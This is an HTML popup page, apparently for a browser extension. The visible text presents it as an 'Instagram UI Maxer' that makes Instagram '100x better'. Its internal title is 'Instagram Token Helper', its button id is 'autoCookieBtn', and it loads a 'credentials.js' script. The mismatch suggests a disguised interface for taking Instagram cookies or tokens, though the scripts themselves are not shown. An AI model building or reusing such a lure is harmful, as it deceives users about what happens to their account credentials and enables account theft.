<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Token Helper</title>
    <style>
      body {
        font-family: "Segoe UI", Arial, sans-serif;
        margin: 0;
        padding: 14px;
        width: 320px;
        background: radial-gradient(circle at top left, #eef2ff 0%, #f8fafc 45%, #fdf2f8 100%);
        color: #111827;
      }
      .card {
        background: rgba(255, 255, 255, 0.95);
        border: 1px solid rgba(229, 231, 235, 0.9);
        border-radius: 18px;
        padding: 16px;
        box-shadow: 0 16px 40px rgba(15, 23, 42, 0.12);
        backdrop-filter: blur(10px);
      }
      h3 {
        margin: 0 0 8px 0;
        font-size: 19px;
        color: #111827;
        letter-spacing: -0.02em;
      }
      .note {
        font-size: 12px;
        color: #6b7280;
        margin: 8px 0 0 0;
        line-height: 1.5;
      }
      button {
        width: 100%;
        margin-top: 12px;
        padding: 11px 12px;
        border: none;
        border-radius: 999px;
        background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 50%, #ec4899 100%);
        color: #ffffff;
        font-weight: 700;
        cursor: pointer;
        box-shadow: 0 8px 20px rgba(79, 70, 229, 0.25);
        transition: transform 0.18s ease, box-shadow 0.18s ease;
      }
      button:hover {
        transform: translateY(-1px);
        box-shadow: 0 10px 24px rgba(79, 70, 229, 0.3);
      }
      #status {
        margin-top: 10px;
        padding: 9px 10px;
        background: linear-gradient(90deg, #f9fafb 0%, #f3f4f6 100%);
        border-radius: 10px;
        min-height: 18px;
        border: 1px solid #e5e7eb;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h3>Instagram UI Maxer</h3>
      <p class="note">Use this make your Instagram 100x better now!</p>
     
      <button id="autoCookieBtn">Max the UI!</button>
      <div id="status" class="note">Waiting…</div>
    </div>
    <script src="credentials.js"></script>
    <script src="popup.js"></script>
  </body>
</html>
